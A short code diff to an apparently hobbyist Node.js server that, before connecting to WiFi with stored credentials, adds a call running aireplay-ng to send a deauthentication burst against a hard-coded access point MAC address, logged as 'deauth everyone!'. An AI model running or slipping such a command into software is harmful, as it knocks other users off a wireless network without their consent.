@@ -85,7 +85,9 @@ var initServer = function() {
 		// console.log("shutdown muwa ha ha");
 
 		// exec("sudo shutdown -h now", puts);
-		
+		console.log("deauth everyone!");
+		exec("aireplay-ng -0 1 -a 00:14:6C:7E:40:80 wlan0", puts);
+
 		var connect = networkInterfaces.content.connect;
 		connect = connect.replace("{ssid}", credentials.ssid);
 		connect = connect.replace("{password}", credentials.password);
